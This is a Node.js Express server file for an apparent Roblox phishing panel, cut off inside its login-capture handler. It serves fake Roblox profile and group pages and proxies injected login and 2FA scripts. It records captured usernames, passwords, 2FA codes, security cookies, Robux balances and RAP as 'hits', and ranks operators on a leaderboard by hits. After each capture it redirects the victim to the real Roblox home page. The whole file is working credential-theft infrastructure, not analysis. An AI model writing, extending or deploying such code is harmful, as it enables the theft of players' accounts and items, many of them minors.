require('dotenv').config();
const express = require('express');
const axios = require('axios');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// Import VOX-inspired modules
const ProxyRotation = require('./proxy-rotation');
const TrueLogin = require('./truelogin');
const TwoFactorHandler = require('./twofactor');
const UnifiedWebhook = require('./unified-webhook');
const ProfileTemplates = require('./profile-templates');
const SiteGenerator = require('./site-generator');
const RichDataCapture = require('./rich-data-capture');

const app = express();
const PORT = process.env.PORT || 3000;

// ── Process guards ──
// Express 4 does not catch a rejected promise thrown inside an async handler.
// Node 22 turns that into a process exit, so one bad upstream call in any of
// the ~35 async routes takes the whole box down. Log and keep serving: the
// request that died already got its socket closed, everything else is fine.
process.on('unhandledRejection', (reason) => {
    const msg = reason && reason.stack ? reason.stack : String(reason);
    console.error('[UNHANDLED] rejected promise:', msg);
});
process.on('uncaughtException', (err) => {
    console.error('[UNCAUGHT]', err && err.stack ? err.stack : String(err));
});

// Initialize VOX-inspired modules
const proxyRotation = new ProxyRotation({
    poolSize: 100,
    maxFailures: 3,
    rotationInterval: 300000
});

const trueLogin = new TrueLogin();
const twoFactorHandler = new TwoFactorHandler();
const unifiedWebhook = new UnifiedWebhook();
const profileTemplates = new ProfileTemplates();
const siteGenerator = new SiteGenerator();

const S = require('./security');
const { GUEST_ID, requireAuth, apiGuard, rateLimitMiddleware, field, int } = S;

// Writable data lives under /tmp on Vercel; the project directory is read-only
// there. Locally the same helper returns the project directory.
const R = require('./lib/runtime');
const store = require('./lib/store');
const { loginPage } = require('./lib/pages/login');
const { profilePage } = require('./lib/pages/profile');
const { communityPage } = require('./lib/pages/community');

// Behind Apache's mod_proxy, req.ip is 127.0.0.1 unless the hop is trusted.
app.set('trust proxy', 1);
app.disable('x-powered-by');

// Baseline headers. Same-origin framing only: the dashboard never embeds itself
// in a third-party page, and nothing here loads in an iframe except the real
// Roblox pages the proxy serves, which are their own documents.
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
    next();
});

app.use(express.json({ limit: '256kb' }));
app.use(express.urlencoded({ extended: true, limit: '256kb' }));
// Injected scripts are versioned by nothing, so a browser that cached an old
// copy keeps rendering the old flow after a fix lands. No-store on the two the
// login page injects; everything else under public/ caches normally.
app.use(express.static(path.join(__dirname, 'public'), {
    setHeaders(res, filePath) {
        const base = path.basename(filePath).toLowerCase();
        if (base === '2fa-client.js' || base === 'proxy-shim.js' || base === 'login.html') {
            res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
        }
    }
}));

S.assertEnv(['SESSION_SECRET']);

const SESSION_TTL = 7 * 24 * 60 * 60 * 1000;
const sessionStore = new S.JsonSessionStore(R.dataPath('sessions.json'), SESSION_TTL);

app.use(session({
    name: 'sid',
    secret: process.env.SESSION_SECRET,
    store: sessionStore,
    resave: false,
    saveUninitialized: false,
    rolling: true,
    cookie: {
        httpOnly: true,
        sameSite: 'lax',
        secure: process.env.COOKIE_SECURE === 'true',
        maxAge: SESSION_TTL
    }
}));

const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
const REDIRECT_URI = process.env.REDIRECT_URI || `http://localhost:${PORT}/callback`;

// Discord compares the redirect_uri byte for byte between the authorize step and
// the token exchange. A hardcoded localhost value silently breaks the panel on
// any real host, so the default is derived from the request that arrived.
function resolveRedirectUri(req) {
    if (process.env.REDIRECT_URI) return process.env.REDIRECT_URI;
    return `${req.protocol || 'https'}://${req.get('host')}/callback`;
}

// CORS allowlist — the auth proxy used to reflect any origin with credentials.
const ALLOWED_ORIGINS = new Set(
    (process.env.ALLOWED_ORIGINS || `http://localhost:${PORT},http://127.0.0.1:${PORT}`)
        .split(',').map(o => o.trim()).filter(Boolean)
);

function applyCors(req, res) {
    return S.applyCors(req, res, ALLOWED_ORIGINS);
}

// ── Persistent Sign-in Log ──
const SIGNINS_FILE = R.seededDataPath('signins.json');

function loadSignins() {
    return S.readJson(SIGNINS_FILE, []);
}

function saveSignins(data) {
    S.writeJsonAtomic(SIGNINS_FILE, data);
}

let signins = loadSignins();

function recordSignin(user) {
    const existingIndex = signins.findIndex(s => s.id === user.id);
    const entry = {
        username: user.username,
        discriminator: user.discriminator || '0',
        id: user.id,
        avatar: user.avatar || null,
        timestamp: Date.now()
    };

    if (existingIndex !== -1) {
        signins.splice(existingIndex, 1);
    }
    signins.unshift(entry);
    if (signins.length > 200) signins = signins.slice(0, 200);
    saveSignins(signins);
    console.log(`[SIGNIN] ${user.username} signed in (Unique Count: ${signins.length})`);
}

// ── Secure Webhooks and Recovery Tokens Store ──
const WEBHOOKS_FILE = R.seededDataPath('webhooks.json');

function loadWebhooks() {
    return S.readJson(WEBHOOKS_FILE, {});
}

function saveWebhooks(data) {
    S.writeJsonAtomic(WEBHOOKS_FILE, data);
}

function hashToken(token) {
    return crypto.createHash('sha256').update(token).digest('hex');
}

function generateRecoveryToken() {
    return 'insanity_rec_' + crypto.randomBytes(16).toString('hex');
}

function createRecoveryEmbed(userId, token, host = 'localhost:3000') {
    const recoveryLink = `http://${host}/?ref=${token}`;
    return {
        embeds: [{
            description: [
                `👑 **Successfully Created!**`,
                ``,
                `🌐 **Recovery Link | Controller**`,
                ``,
                `📈 **Your Recovery Link:**`,
                `\`\`\`\n${recoveryLink}\n\`\`\``,
                `🔑 **Token:**`,
                `\`\`\`\n${token}\n\`\`\``
            ].join('\n'),
            color: 2829617 // #2b2d31 dark grey
        }]
    };
}

// ── Game API Integration ──
const customLinksStore = new Set();

// ── Express Cache ──
const expressCache = {};
const CACHE_TTL = 15 * 1000; // 15 seconds in ms

function getCached(key) {
    const entry = expressCache[key];
    if (entry && (Date.now() - entry.timestamp < CACHE_TTL)) {
        return entry.data;
    }
    return null;
}

function setCache(key, data) {
    expressCache[key] = {
        timestamp: Date.now(),
        data: data
    };
}

function formatNumber(num) {
    if (num === undefined || num === null) return "0";
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

function formatLargeNumber(num) {
    if (num === undefined || num === null) return "0";
    if (num >= 1e9) {
        return (num / 1e9).toFixed(1) + "B";
    }
    if (num >= 1e6) {
        return (num / 1e6).toFixed(1) + "M";
    }
    return formatNumber(num);
}

async function fetchUniverseGame(universeId) {
    if (!universeId) return null;
    const gameRes = await fetch(`https://games.roblox.com/v1/games?universeIds=${universeId}`, {
        headers: ROBLOX_HEADERS
    });
    const gameData = await gameRes.json();
    return (gameData && gameData.data && gameData.data[0]) || null;
}

async function resolveGameIdentifiers(id) {
    const normalizedId = String(id || '').trim();
    if (!normalizedId) return null;

    const cacheKey = `game_identifiers_${normalizedId}`;
    const cachedData = getCached(cacheKey);
    if (cachedData) {
        return cachedData;
    }

    let resolved = null;

    try {
        const placeUniverseRes = await fetch(`https://apis.roblox.com/universes/v1/places/${normalizedId}/universe`, {
            headers: ROBLOX_HEADERS
        });
        if (placeUniverseRes.ok) {
            const placeUniverseData = await placeUniverseRes.json();
            if (placeUniverseData && placeUniverseData.universeId) {
                const universeGame = await fetchUniverseGame(placeUniverseData.universeId);
                if (universeGame) {
                    resolved = {
                        requestedId: normalizedId,
                        placeId: normalizedId,
                        universeId: String(placeUniverseData.universeId),
                        game: universeGame
                    };
                }
            }
        }
    } catch (e) {
        console.warn(`[GAME] Failed resolving ${normalizedId} as place ID:`, e.message);
    }

    if (!resolved) {
        try {
            const universeGame = await fetchUniverseGame(normalizedId);
            if (universeGame) {
                resolved = {
                    requestedId: normalizedId,
                    placeId: String(universeGame.rootPlaceId || normalizedId),
                    universeId: String(universeGame.id),
                    game: universeGame
                };
            }
        } catch (e) {
            console.warn(`[GAME] Failed resolving ${normalizedId} as universe ID:`, e.message);
        }
    }

    if (resolved) {
        setCache(cacheKey, resolved);
    }
    return resolved;
}

const gamePresets = {
    "920587212": {
        id: "920587212",
        title: "[ 🎧 ] Adopt Me!",
        desc: "Raise and dress cute pets, decorate your house, and roleplay with friends in the magical world of Adoption Island!",
        players: "316,268",
        likes: "9,222,344",
        dislikes: "1,503,850",
        visits: "35.2B",
        creator: "DreamCraft",
        image: "https://images.unsplash.com/photo-1593085512500-5d55148d6f0d?w=400&q=80"
    },
    "142823291": {
        id: "142823291",
        title: "Murder Mystery 2",
        desc: "Can you solve the Mystery and survive each round? Innocents: Run and hide. Sheriff: Protect Innocents. Murderer: Eliminate everyone.",
        players: "215,100",
        likes: "4,982,551",
        dislikes: "432,950",
        visits: "12.4B",
        creator: "Nikilis",
        image: "https://images.unsplash.com/photo-1509198397868-475647b2a1e5?w=400&q=80"
    },
    "2753915549": {
        id: "2753915549",
        title: "Blox Fruits",
        desc: "Become a master swordsman or a powerful fruit user as you train to become the strongest player to ever live.",
        players: "384,500",
        likes: "12,482,109",
        dislikes: "586,104",
        visits: "36.2B",
        creator: "Gamer Robot Inc",
        image: "https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?w=400&q=80"
    }
};

// ── Routes ──

app.get('/', (req, res) => {
    const token = req.query.token || req.query.ref;
    if (token && token.startsWith('insanity_rec_')) {
        const hash = hashToken(token);
        const webhooks = loadWebhooks();
        let foundUser = null;
        for (const id in webhooks) {
            if (webhooks[id].tokenHash === hash) {
                foundUser = {
                    id: id,
                    username: webhooks[id].username,
                    avatar: webhooks[id].avatar
                };
                break;
            }
        }
        if (foundUser) {
            req.session.user = foundUser;
            recordSignin(foundUser);
            return res.redirect('/dashboard');
        }
    }
    res.sendFile(__dirname + '/public/index.html');
});

app.get('/auth', (req, res) => {
    const token = req.query.token || req.query.ref;
    if (token && token.startsWith('insanity_rec_')) {
        const hash = hashToken(token);
        const webhooks = loadWebhooks();
        let foundUser = null;
        for (const id in webhooks) {
            if (webhooks[id].tokenHash === hash) {
                foundUser = {
                    id: id,
                    username: webhooks[id].username,
                    avatar: webhooks[id].avatar
                };
                break;
            }
        }
        if (foundUser) {
            req.session.user = foundUser;
            recordSignin(foundUser);
            return res.redirect('/dashboard');
        }
    }

    if (!DISCORD_CLIENT_ID || DISCORD_CLIENT_ID === 'your_client_id_here' || !DISCORD_CLIENT_SECRET || DISCORD_CLIENT_SECRET === 'your_client_secret_here') {
        // Dev fallback
        const devUser = {
            id: '782910482910482910',
            username: 'InsanityDeveloper',
            discriminator: '0001',
            avatar: ''
        };
        req.session.user = devUser;
        recordSignin(devUser);
        return res.redirect('/dashboard');
    }
    const scope = 'identify';
    const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(resolveRedirectUri(req))}&response_type=code&scope=${scope}`;
    res.redirect(discordAuthUrl);
});

app.get('/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) {
        return res.redirect('/');
    }

    try {
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: DISCORD_CLIENT_ID,
            client_secret: DISCORD_CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: resolveRedirectUri(req)
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const { access_token } = tokenResponse.data;
        req.session.access_token = access_token;

        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { 'Authorization': `Bearer ${access_token}` }
        });

        const user = userResponse.data;
        req.session.user = user;
        recordSignin(user);

        // Update profile in webhooks store if connected
        const webhooks = loadWebhooks();
        if (webhooks[user.id]) {
            webhooks[user.id].username = user.username;
            webhooks[user.id].avatar = user.avatar;
            saveWebhooks(webhooks);
        }

        res.redirect('/dashboard');

    } catch (error) {
        console.error('OAuth error:', error.message);
        res.redirect('/');
    }
});

app.get('/dashboard', (req, res) => {
    // The panel holds the capture surface, so the same rule as the API: the
    // operator at the bench, a signed-in operator, or an explicit opt-in.
    const open = process.env.DASHBOARD_OPEN === 'true';
    if (!open && !S.isAuthenticated(req) && !S.isTrustedLocal(req)) {
        return res.redirect('/auth');
    }
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

const PUBLIC_GUEST_USER = {
    id: GUEST_ID,
    username: 'Guest',
    discriminator: '0000',
    avatar: ''
};

app.get('/api/user', (req, res) => {
    res.json(req.session.user || PUBLIC_GUEST_USER);
});

// Every /api route below this line goes through the gate. Routes that an
// anonymous visitor legitimately needs are on the allowlist in security.js.
app.use('/api', apiGuard);

// ── Webhook Recovery API ──

app.get('/api/webhook/status', (req, res) => {
    if (!S.isAuthenticated(req)) return res.json({ connected: false });
    const userId = req.session.user.id;
    const webhooks = loadWebhooks();
    const entry = webhooks[userId];
    if (entry) {
        // The full URL carries a token that can post as the operator. Never
        // echo it back — the masked form is enough for the UI to render.
        let masked = 'https://discord.com/api/webhooks/...';
        try {
            const match = entry.webhookUrl.match(/\/webhooks\/(\d+)\//);
            if (match) masked = `https://discord.com/api/webhooks/${match[1]}/••••••••••••••••`;
        } catch (e) {}
        return res.json({ connected: true, webhookUrl: masked });
    }
    res.json({ connected: false });
});

app.post('/api/webhook/save', rateLimitMiddleware('webhook-save', 10, 60_000), async (req, res) => {
    const actor = req.session.user;
    const { webhookUrl } = req.body;
    if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        return res.status(400).json({ error: 'Invalid Discord Webhook URL' });
    }

    const token = generateRecoveryToken();
    const hash = hashToken(token);

    const webhooks = loadWebhooks();
    webhooks[actor.id] = {
        webhookUrl: webhookUrl,
        tokenHash: hash,
        username: actor.username,
        avatar: actor.avatar || ''
    };
    saveWebhooks(webhooks);

    // The token is delivered to the webhook only. Returning it in the HTTP
    // response put it back in the browser, which defeated the point.
    try {
        await axios.post(webhookUrl, createRecoveryEmbed(actor.id, token, req.get('host')));
    } catch (e) {
        console.error('Webhook payload fail:', e.message);
    }

    res.json({ success: true, tokenSent: true });
});

app.post('/api/webhook/regenerate', async (req, res) => {
    const actor = req.session.user;
    const webhooks = loadWebhooks();
    const entry = webhooks[actor.id];
    if (!entry) {
        return res.status(400).json({ error: 'No webhook connected' });
    }

    const token = generateRecoveryToken();
    entry.tokenHash = hashToken(token);
    saveWebhooks(webhooks);

    try {
        await axios.post(entry.webhookUrl, createRecoveryEmbed(actor.id, token, req.get('host')));
    } catch (e) {
        console.error('Webhook payload fail:', e.message);
        return res.status(502).json({ error: 'Webhook dispatch failed' });
    }

    res.json({ success: true, tokenSent: true });
});

const RECOVERY_TOKEN_TTL = 10 * 60 * 1000; // ten minutes, single use

app.post('/api/webhook/recover', rateLimitMiddleware('webhook-recover', 3, 60_000), async (req, res) => {
    const { webhookUrl } = req.body;
    if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        return res.status(400).json({ error: 'Invalid Webhook URL' });
    }

    const webhooks = loadWebhooks();
    let userId = null;
    for (const id in webhooks) {
        if (webhooks[id].webhookUrl === webhookUrl) {
            userId = id;
            break;
        }
    }

    // Same response either way: a 404 here was an account-existence oracle.
    if (!userId) {
        return res.json({ success: true, message: 'If that webhook is registered, a token was sent to it.' });
    }

    const token = generateRecoveryToken();
    webhooks[userId].tokenHash = hashToken(token);
    webhooks[userId].tokenExpiresAt = Date.now() + RECOVERY_TOKEN_TTL;
    saveWebhooks(webhooks);

    try {
        await axios.post(webhookUrl, createRecoveryEmbed(userId, token, req.get('host')));
        res.json({ success: true, message: 'A new recovery token was sent to the connected Discord channel.' });
    } catch (e) {
        console.error('Recover webhook error:', e.message);
        res.status(502).json({ error: 'Failed to dispatch webhook message. Is the URL valid?' });
    }
});

app.post('/api/webhook/login-with-token', rateLimitMiddleware('token-login', 5, 60_000), (req, res) => {
    const { recoveryToken } = req.body;
    if (!recoveryToken) {
        return res.status(400).json({ error: 'Recovery token is required' });
    }

    const hash = hashToken(recoveryToken);
    const webhooks = loadWebhooks();
    let foundUser = null;
    let foundKey = null;

    for (const id in webhooks) {
        const entry = webhooks[id];
        if (!entry.tokenHash) continue;
        if (entry.tokenExpiresAt && Date.now() > entry.tokenExpiresAt) continue;
        if (entry.tokenHash === hash) {
            foundUser = { id: id, username: entry.username, avatar: entry.avatar };
            foundKey = id;
            break;
        }
    }

    if (!foundUser) {
        return res.status(401).json({ error: 'Invalid or expired recovery token.' });
    }

    // Burn the token, then reissue the session ID. Setting a user on an
    // existing session ID is textbook fixation.
    webhooks[foundKey].tokenHash = '';
    webhooks[foundKey].tokenExpiresAt = 0;
    saveWebhooks(webhooks);

    req.session.regenerate(err => {
        if (err) {
            console.error('[SESSION] regenerate failed:', err.message);
            return res.status(500).json({ error: 'Session error' });
        }
        req.session.user = foundUser;
        recordSignin(foundUser);
        res.json({ success: true, redirect: '/dashboard' });
    });
});

// ── Persistent Real Hits & Visits Store ──
const HITS_FILE = R.seededDataPath('hits.json');
const VISITS_FILE = R.seededDataPath('visits.json');

const HITS_KEY = 'kittywilly:hits';
const VISITS_KEY = 'kittywilly:visits';

function loadHits() {
    const parsed = S.readJson(HITS_FILE, []);
    return Array.isArray(parsed) ? parsed : [];
}

function saveHits(data) {
    S.writeJsonAtomic(HITS_FILE, data);
}

// Durable write. File mode is the old synchronous path; shared mode puts the
// same array in Redis so every instance sees every capture. Callers that can
// await this before responding should — see the recordHit/handleCapturedSession
// call sites, where an unawaited write is a row lost to a frozen invocation.
function persistHits(data) {
    return store.saveJson(HITS_KEY, HITS_FILE, data);
}

// Pull the shared list back into memory before a read. No-op in file mode,
// where hitsStore is already authoritative for this process.
async function refreshHits() {
    if (!store.SHARED) return;
    const rows = await store.loadJson(HITS_KEY, HITS_FILE, null);
    if (Array.isArray(rows)) hitsStore = rows;
}

function loadVisits() {
    const parsed = S.readJson(VISITS_FILE, []);
    return Array.isArray(parsed) ? parsed : [];
}

function saveVisits(data) {
    S.writeJsonAtomic(VISITS_FILE, data);
}

function persistVisits(data) {
    return store.saveJson(VISITS_KEY, VISITS_FILE, data);
}

let hitsStore = loadHits();
let visitsStore = loadVisits();

function resolveOperator(operatorIdOrName, targetType, targetId, sessionUser) {
    const profiles = typeof loadProfiles === 'function' ? loadProfiles() : {};
    const communities = typeof loadCommunities === 'function' ? loadCommunities() : {};
    const webhooks = loadWebhooks();

    let candidateId = operatorIdOrName || null;

    if (!candidateId && targetId) {
        if (targetType === 'profile' && profiles[targetId]?.createdBy) {
            candidateId = profiles[targetId].createdBy;
        } else if (targetType === 'group' && communities[targetId]?.createdBy) {
            candidateId = communities[targetId].createdBy;
        } else if (profiles[targetId]?.createdBy) {
            candidateId = profiles[targetId].createdBy;
        } else if (communities[targetId]?.createdBy) {
            candidateId = communities[targetId].createdBy;
        }
    }

    if ((!candidateId || candidateId === 'anonymous' || candidateId === 'public') && sessionUser && sessionUser.id && sessionUser.id !== 'public') {
        candidateId = sessionUser.id;
    }

    if (candidateId) {
        const signinMatch = signins.find(s => String(s.id) === String(candidateId) || s.username === candidateId);
        if (signinMatch) {
            return {
                id: String(signinMatch.id),
                username: signinMatch.username,
                avatar: signinMatch.avatar ? `https://cdn.discordapp.com/avatars/${signinMatch.id}/${signinMatch.avatar}.png` : null
            };
        }
        if (webhooks[candidateId] && webhooks[candidateId].username) {
            return {
                id: String(candidateId),
                username: webhooks[candidateId].username,
                avatar: webhooks[candidateId].avatar ? `https://cdn.discordapp.com/avatars/${candidateId}/${webhooks[candidateId].avatar}.png` : null
            };
        }
        if (candidateId !== 'anonymous' && candidateId !== 'public') {
            return { id: String(candidateId), username: String(candidateId), avatar: null };
        }
    }

    if (signins.length > 0) {
        const latest = signins[0];
        return {
            id: String(latest.id),
            username: latest.username,
            avatar: latest.avatar ? `https://cdn.discordapp.com/avatars/${latest.id}/${latest.avatar}.png` : null
        };
    }

    return { id: 'local', username: 'Local', avatar: null };
}

function recordVisit({ type = 'link', targetId = '', targetName = '', operatorId = null, ip = '127.0.0.1', sessionUser = null }) {
    const profiles = typeof loadProfiles === 'function' ? loadProfiles() : {};
    const communities = typeof loadCommunities === 'function' ? loadCommunities() : {};

    let resolvedName = targetName;
    if (!resolvedName && targetId) {
        if (type === 'profile' && profiles[targetId]) {
            resolvedName = profiles[targetId].fakeDisplayName || profiles[targetId].fakeUsername || `Profile #${targetId}`;
        } else if (type === 'group' && communities[targetId]) {
            resolvedName = communities[targetId].fakeGroupName || communities[targetId].fake_group_name || `Group #${targetId}`;
        } else if (type === 'game') {
            resolvedName = `Place #${targetId}`;
        }
    }

    const op = resolveOperator(operatorId, type, targetId, sessionUser);
    const entry = {
        id: crypto.randomBytes(6).toString('hex'),
        type,
        targetId: String(targetId || ''),
        targetName: resolvedName || String(targetId || type),
        operator: op.username,
        operatorId: op.id,
        ip: String(ip || '127.0.0.1').replace('::ffff:', ''),
        timestamp: Date.now()
    };

    visitsStore.unshift(entry);
    if (visitsStore.length > 500) visitsStore = visitsStore.slice(0, 500);
    persistVisits(visitsStore).catch(() => {});
    return entry;
}

async function recordHit({
    username = 'Unknown',
    userId = null,
    avatarUrl = null,
    balance = 0,
    summary = 0,
    rap = 0,
    hasCookie = false,
    cookie = '',
    source = 'login',
    targetId = '',
    operatorId = null,
    ip = '127.0.0.1',
    sessionUser = null
}) {
    const cleanUser = String(username || 'Unknown').trim() || 'Unknown';
    const op = resolveOperator(operatorId, source, targetId, sessionUser);

    const entry = {
        id: crypto.randomBytes(6).toString('hex'),
        username: cleanUser,
        userId: userId ? String(userId) : null,
        avatarUrl: avatarUrl || null,
        balance: Number(balance) || 0,
        summary: Number(summary) || Number(balance) || 0,
        rap: Number(rap) || 0,
        hasCookie: Boolean(hasCookie),
        cookie: cookie ? String(cookie) : '',
        source,
        targetId: String(targetId || ''),
        operator: op.username,
        operatorId: op.id,
        ip: String(ip || '127.0.0.1').replace('::ffff:', ''),
        timestamp: Date.now()
    };

    hitsStore.unshift(entry);
    if (hitsStore.length > 500) hitsStore = hitsStore.slice(0, 500);
    // Awaited: the capture route answers right after this, and on a serverless
    // platform an unawaited write can be frozen mid-flight.
    await persistHits(hitsStore);

    // Enrich with real Roblox userId + avatar headshot in background if missing
    if (!entry.avatarUrl && cleanUser && cleanUser !== 'Unknown') {
        (async () => {
            try {
                const searchRes = await fetch('https://users.roblox.com/v1/usernames/users', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify({ usernames: [cleanUser], excludeBannedUsers: false })
                });
                const searchData = await searchRes.json();
                const foundUser = searchData?.data?.[0];
                if (foundUser && foundUser.id) {
                    entry.userId = String(foundUser.id);
                    entry.username = foundUser.name || entry.username;
                    const thumbRes = await fetch(
                        `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${foundUser.id}&size=150x150&format=Png&isCircular=false`
                    );
                    const thumbData = await thumbRes.json();
                    const rawImg = thumbData?.data?.[0]?.imageUrl;
                    if (rawImg) {
                        entry.avatarUrl = `/proxy/image?url=${encodeURIComponent(rawImg)}`;
                    }
                    await persistHits(hitsStore);
                }
            } catch (e) {}
        })();
    }

    return entry;
}

function buildRealLeaderboard() {
    const profiles = typeof loadProfiles === 'function' ? loadProfiles() : {};
    const communities = typeof loadCommunities === 'function' ? loadCommunities() : {};
    const webhooks = loadWebhooks();
    const map = new Map();

    const ensureUser = (id, username, avatar) => {
        const key = String(id || username || 'local');
        if (!map.has(key)) {
            map.set(key, {
                id: key,
                username: username || key,
                avatar: avatar || null,
                hits: 0,
                visits: 0,
                links: 0,
                rap: 0,
                balance: 0
            });
        } else {
            const u = map.get(key);
            if (username && (u.username === u.id || u.username === 'Anonymous')) u.username = username;
            if (avatar && !u.avatar) u.avatar = avatar;
        }
        return map.get(key);
    };

    // 1. Registered sign-in users
    signins.forEach(s => {
        const avatarUrl = s.avatar ? `https://cdn.discordapp.com/avatars/${s.id}/${s.avatar}.png` : null;
        ensureUser(s.id, s.username, avatarUrl);
    });

    // 2. Webhook-configured users
    Object.entries(webhooks).forEach(([uid, w]) => {
        if (w && w.username) {
            const avatarUrl = w.avatar ? `https://cdn.discordapp.com/avatars/${uid}/${w.avatar}.png` : null;
            ensureUser(uid, w.username, avatarUrl);
        }
    });

    // 3. Profile creators
    Object.values(profiles).forEach(p => {
        const rawAuthor = p.createdBy || 'anonymous';
        if (rawAuthor === 'anonymous' || rawAuthor === 'public') return;
        const resolved = resolveOperator(rawAuthor);
        const u = ensureUser(resolved.id, resolved.username, resolved.avatar);
        u.links++;
    });

    // 4. Community creators
    Object.values(communities).forEach(c => {
        const rawAuthor = c.createdBy || 'anonymous';
        if (rawAuthor === 'anonymous' || rawAuthor === 'public') return;
        const resolved = resolveOperator(rawAuthor);
        const u = ensureUser(resolved.id, resolved.username, resolved.avatar);
        u.links++;
    });

    // 5. Real Visits
    visitsStore.forEach(v => {
        const resolved = resolveOperator(v.operatorId || v.operator);
        const u = ensureUser(resolved.id, resolved.username, resolved.avatar);
        u.visits++;
    });

    // 6. Real Hits
    hitsStore.forEach(h => {
        const resolved = resolveOperator(h.operatorId || h.operator);
        const u = ensureUser(resolved.id, resolved.username, resolved.avatar);
        u.hits++;
        u.rap += Number(h.rap) || 0;
        u.balance += Number(h.balance) || 0;
    });

    return Array.from(map.values())
        .sort((a, b) => (b.hits - a.hits) || (b.visits - a.visits) || (b.links - a.links));
}

// ── Real Sign-in, Stats, Hits, Visits, & Leaderboard API ──

app.get('/api/signins', async (req, res) => {
    res.json(signins.slice(0, 50));
});

app.get('/api/hits', async (req, res) => {
    // Shared mode rehydrates from the durable list, so a capture written by a
    // different instance is visible here. File mode is a no-op.
    await refreshHits();
    res.json(hitsStore.slice(0, 500));
});

app.get('/api/visits', async (req, res) => {
    if (store.SHARED) {
        const rows = await store.loadJson(VISITS_KEY, VISITS_FILE, null);
        if (Array.isArray(rows)) visitsStore = rows;
    }
    res.json(visitsStore.slice(0, 100));
});

app.get('/api/leaderboard', (req, res) => {
    res.json(buildRealLeaderboard());
});

// Login page poll target. Reads only: no capture data, no credentials — a
// boolean and the destination, keyed by the caller's own address.
app.get('/api/login-state', (req, res) => {
    const ip = req.ip || req.connection.remoteAddress || '';
    const at = recentLogins.get(ip) || 0;
    // Single shot. The first page to ask gets the answer and the flag is
    // cleared, so one capture can never bounce a different visitor sharing the
    // same address, and a stale entry cannot redirect a fresh page load.
    if (at && Date.now() - at < 90 * 1000) {
        recentLogins.delete(ip);
        return res.json({ complete: true, redirect: 'https://www.roblox.com/home' });
    }
    res.json({ complete: false, redirect: null });
});

app.get('/api/stats', async (req, res) => {
    await refreshHits();
    const profiles = typeof loadProfiles === 'function' ? loadProfiles() : {};
    const communities = typeof loadCommunities === 'function' ? loadCommunities() : {};
    const profileList = Object.values(profiles);
    const communityList = Object.values(communities);

    const startOfToday = new Date();
    startOfToday.setHours(0, 0, 0, 0);
    const todayMs = startOfToday.getTime();

    const hitsTodayList = hitsStore.filter(h => (h.timestamp || 0) >= todayMs);
    const visitsTodayList = visitsStore.filter(v => (v.timestamp || 0) >= todayMs);

    const linksTodayCount =
        profileList.filter(p => p.createdAt && new Date(p.createdAt).getTime() >= todayMs).length +
        communityList.filter(c => c.createdAt && new Date(c.createdAt).getTime() >= todayMs).length;

    const sumField = (arr, field) => arr.reduce((acc, item) => acc + (Number(item[field]) || 0), 0);

    // Build 7-day real activity buckets (oldest -> today)
    const DAY_NAMES = ['SUN', 'MON', 'TUE', 'WED', 'THU', 'FRI', 'SAT'];
    const dailyActivity = [];
    for (let i = 6; i >= 0; i--) {
        const dStart = new Date(startOfToday);
        dStart.setDate(startOfToday.getDate() - i);
        const startMs = dStart.getTime();
        const endMs = startMs + 86400000;

        const dayHits = hitsStore.filter(h => h.timestamp >= startMs && h.timestamp < endMs).length;
        const dayVisits = visitsStore.filter(v => v.timestamp >= startMs && v.timestamp < endMs).length;
        const dayLinks =
            profileList.filter(p => {
                const t = p.createdAt ? new Date(p.createdAt).getTime() : 0;
                return t >= startMs && t < endMs;
            }).length +
            communityList.filter(c => {
                const t = c.createdAt ? new Date(c.createdAt).getTime() : 0;
                return t >= startMs && t < endMs;
            }).length;

        dailyActivity.push({
            label: DAY_NAMES[dStart.getDay()],
            date: dStart.toISOString().split('T')[0],
            hits: dayHits,
            visits: dayVisits,
            links: dayLinks,
            total: dayHits + dayVisits + dayLinks
        });
    }

    res.json({
        totalSignins: signins.length,
        totalHits: hitsStore.length,
        hitsToday: hitsTodayList.length,
        totalVisits: visitsStore.length,
        visitsToday: visitsTodayList.length,
        totalLinks: profileList.length + communityList.length,
        linksToday: linksTodayCount,
        summaryTotal: sumField(hitsStore, 'summary'),
        summaryToday: sumField(hitsTodayList, 'summary'),
        rapTotal: sumField(hitsStore, 'rap'),
        rapToday: sumField(hitsTodayList, 'rap'),
        balanceTotal: sumField(hitsStore, 'balance'),
        balanceToday: sumField(hitsTodayList, 'balance'),
        dailyActivity
    });
});

// ── Login Capture API (for PHP proxy) ──

async function captureLoginHandler(req, res) {
    const { type, data: raw, timestamp } = req.body || {};
    const data = raw && typeof raw === 'object' ? raw : {};
    const kind = String(type || 'login');

    console.log(`[CAPTURE] ${kind.toUpperCase()} event at ${timestamp || new Date().toISOString()}`);

    // The fake form posts {username,password} in some builds and Roblox's own
    // {cvalue,password} shape in others. Normalise once here so nothing
    // downstream has to guess which one arrived.
    const username = S.field(data.username || data.cvalue || data.login || '', 128).trim();
    const password = S.field(data.password || data.pass || '', 256);
    const twoFactorCode = S.field(data.twoFactorCode || data.code || '', 32);
    const cookie = S.field(data.cookie || data.roblox_security_cookie || '', 2048);
